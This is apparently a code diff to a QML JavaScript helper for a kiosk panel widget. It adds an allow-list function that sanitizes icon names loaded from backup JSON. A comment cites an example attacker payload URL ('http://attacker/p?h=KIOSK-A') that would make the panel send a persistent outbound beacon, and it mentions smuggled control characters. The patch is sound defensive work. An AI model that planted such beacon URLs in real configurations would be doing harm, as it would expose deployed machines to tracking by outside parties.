@@ -23,6 +23,28 @@
  */
 .pragma library
 
+// Allow-list for thumbIconName. IconPickerDialog emits exactly three
+// shapes (theme name, "bundled:<name>", "file:///<abs path>"); anything
+// else can only arrive via attacker-crafted backup JSON (BackupBridge
+// does not introspect urlsJson contents). Without this gate, a payload
+// like "http://attacker/p?h=KIOSK-A" would reach Kirigami.Icon, which
+// actually issues outbound HTTP via QQmlEngine::networkAccessManager —
+// a persistent beacon on every panel paint / auto-cycle / reload.
+function sanitizeIconName(name) {
+    const s = String(name || "");
+    if (s.length === 0) return "";
+    // "bundled:<safe>" — no path separators, no ".." traversal out of
+    // package/contents/icons/bundled/.
+    if (/^bundled:[A-Za-z0-9_-]+$/.test(s)) return s;
+    // "file:///<abs path>" from the operator's FileDialog pick. Refuse
+    // C0/DEL so a smuggled CR/LF can't smear into a downstream renderer.
+    if (/^file:\/\/\//.test(s) && !/[\x00-\x1f\x7f]/.test(s)) return s;
+    // FreeDesktop icon-naming spec: letters/digits/dot/dash/underscore.
+    // Leading char must be alnum so a stray "://" can't slip through.
+    if (/^[A-Za-z0-9][A-Za-z0-9._-]*$/.test(s)) return s;
+    return "";
+}
+
 function normaliseTabRow(entry) {
     entry = entry || {};
     let mode = entry.thumbMode || "";
@@ -40,7 +62,7 @@ function normaliseTabRow(entry) {
         thumbMode:      mode,
         thumbSelector:  sel,
         thumbText:      entry.thumbText || "",
-        thumbIconName:  entry.thumbIconName || "",
+        thumbIconName:  sanitizeIconName(entry.thumbIconName),
         thumbTimeRange: entry.thumbTimeRange || "",
         popupMode:      pmode,
         popupSelector:  psel,
